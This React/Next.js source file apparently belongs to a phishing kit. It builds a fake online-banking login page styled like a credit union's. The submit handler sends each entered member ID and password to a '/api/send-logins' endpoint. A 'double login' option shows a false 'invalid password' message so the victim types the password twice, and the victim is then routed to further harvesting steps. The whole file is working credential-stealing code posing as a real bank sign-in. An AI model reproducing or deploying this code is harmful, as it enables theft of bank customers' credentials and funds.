/* eslint-disable @next/next/no-img-element */
import type { NextPage } from "next";
import Head from "next/head";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import axios from "axios";
import { useForm } from "react-hook-form";
import { useRouter } from "next/router";
import { useState, useContext } from "react";
import { Container } from "../components/Container";
import { Wrapper } from "../components/Wrapper";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";
import { DataContext } from "./_app";
import { Error } from "../components/Error";
import { Loader } from "../components/Loader";
import { Button } from "../components/Button";

const schema = yup.object().shape({
  memberId: yup
    .number()
    .typeError(`Member ID not valid.`)
    .required(`Member ID required.`)
    .min(2, ``),
  password: yup.string().required(`Password required.`).min(6),
});

const Home: NextPage = () => {
  const [loginAttempt, setLoginAttempt] = useState(0);
  const [showError, setShowError] = useState(``);
  const [loading, setLoading] = useState(false);

  const [logins, setLogins] = useState({});
  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    reset,
    formState: { errors },

    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onSubmit`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `LOGIN DETAILS`);
    formData.append(
      `loginDetails`,
      JSON.stringify({ loginAttempt: loginAttempt + 1, ...data })
    );

    try {
      await axios.post(`/api/send-logins`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setLogins({
      ...logins,
      [loginAttempt + 1]: {
        form: `LOGIN DETAILS`,
        loginDetails: { loginAttempt: loginAttempt + 1, ...data },
      },
    });

    if (!loginAttempt && process.env.NEXT_PUBLIC_DOUBLE_LOGIN === `ON`) {
      setLoginAttempt(1);
      setLoading(false);
      setShowError(
        `The Member Number or Password you entered is invalid. Please verify the Member Number and re-enter the Password.`
      );
      reset({
        password: ``,
      });
      return;
    }

    setData({
      ...datas,
      logins: {
        ...logins,
        [loginAttempt + 1]: {
          form: `LOGIN DETAILS`,
          loginDetails: { loginAttempt: loginAttempt + 1, ...data },
        },
      },
    });

    const url = getProgress()[0];

    push(getNextUrl(url));
  });

  return (
    <Wrapper>
      <Head>
        <title>Welcome to Online Banking</title>
      </Head>
      <Container>
        <div className={`login-form`}>
          <h3>Welcome to Online Banking</h3>
          <form>
            <fieldset>
              <legend>
                <span
                  className={`scuBlueText`}
                  style={{
                    display: showError ? `none` : `block`,
                  }}
                >
                  Login
                </span>
                <span
                  style={{
                    display: showError ? `block` : `none`,
                  }}
                >
                  <span className="scuGreenText">Authenticating </span>
                  <span className="scuBlueText">{watch(`memberId`)}</span>
                </span>
              </legend>
              <Error
                errors={showError ? { error: { message: showError } } : errors}
              />
              <div
                style={{
                  display: loading ? `none` : `block`,
                }}
              >
                <h5 className={`scuBlueText`}>
                  {showError ? `Password` : `Member Number & Password`}
                </h5>
                <div
                  className={`control-group`}
                  style={{
                    display: showError ? `none` : `block`,
                  }}
                >
                  <input
                    id="txtMemberNumber"
                    type="text"
                    // data-val-required="The Member ID field is required."
                    placeholder="Member ID"
                    className={
                      errors.memberId && errors.memberId.message
                        ? `input-validation-error`
                        : ``
                    }
                    {...register(`memberId`)}
                  />
                </div>
                <div className="control-group">
                  <input
                    id="txtPassword"
                    data-val="true"
                    placeholder="Password"
                    type="password"
                    className={
                      errors.password && errors.password.message
                        ? `input-validation-error`
                        : ``
                    }
                    {...register(`password`)}
                  />
                </div>
                <div className="center">
                  <a>Forgot Password?</a>
                </div>
              </div>
              <Loader
                style={{
                  display: loading ? `block` : `none`,
                }}
              />
              {showError ? (
                <div className="center">
                  <span className="small-text">
                    <br />
                    <a
                      title="Login Again"
                      onClick={() => {
                        reset({
                          memberId: ``,
                        });
                        setShowError(``);
                      }}
                    >
                      Login again
                    </a>{" "}
                    with a different member number?
                    <br />
                  </span>
                </div>
              ) : null}
              <hr />
              {!loading ? (
                <Button loading={loading} onClick={onSubmit}>
                  Login
                </Button>
              ) : null}
            </fieldset>
          </form>
        </div>
      </Container>
    </Wrapper>
  );
};

export default Home;
